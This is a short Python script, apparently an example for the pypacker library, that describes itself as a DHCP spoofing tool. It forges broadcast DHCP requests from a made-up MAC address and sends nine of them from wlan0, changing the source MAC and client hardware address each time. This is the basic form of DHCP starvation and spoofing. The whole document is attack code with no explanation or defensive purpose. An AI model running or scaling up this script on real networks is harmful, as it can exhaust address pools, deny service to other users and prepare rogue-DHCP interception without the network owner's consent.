"""Simple DHCP spoofing tool."""
from pypacker import pypacker
from pypacker.layer12 import ethernet
from pypacker.layer3 import ip
from pypacker.layer4 import udp
from pypacker.layer567 import dhcp

from pypacker import psocket
import time

# interface to listen on
IFACE	= "wlan0"

#
# spoof DHCP request
#
dhcp_param	= [dhcp.DHCP_OPT_NETMASK, dhcp.DHCP_OPT_ROUTER, dhcp.DHCP_OPT_DNS_SVRS, dhcp.DHCP_OPT_NISTIMESERV]
dhcp_spoof	= ethernet.Ethernet(src_s="20:16:d8:ef:1f:49", dst_s="ff:ff:ff:ff:ff:ff") +\
		ip.IP(src_s="0.0.0.0", dst_s="255.255.255.255", p=ip.IP_PROTO_UDP, id=1) +\
		udp.UDP(sport=68, dport=67) +\
		dhcp.DHCP(chaddr=pypacker.mac_str_to_bytes("20:16:d8:ef:1f:49") + b"\x00" * 10,
				xid=0,
				opts=[
					dhcp.DHCPOptMulti(type=dhcp.DHCP_OPT_MSGTYPE, len=3, body_bytes=b"\x01"),
					dhcp.DHCPOptSingle(type=0xff)
				]
			)

psock	= psocket.SocketHndl(iface_name=IFACE)

for a in range(9):
	print("sending DHCP request")
	psock.send(dhcp_spoof.bin())
	mac = "08:9e:01:dd:ee:f%d" % a
	dhcp_spoof.src_s = mac
	dhcp_spoof.chaddr = pypacker.mac_str_to_bytes(mac) + b"\x00" * 10
	time.sleep(1)
psock.close()
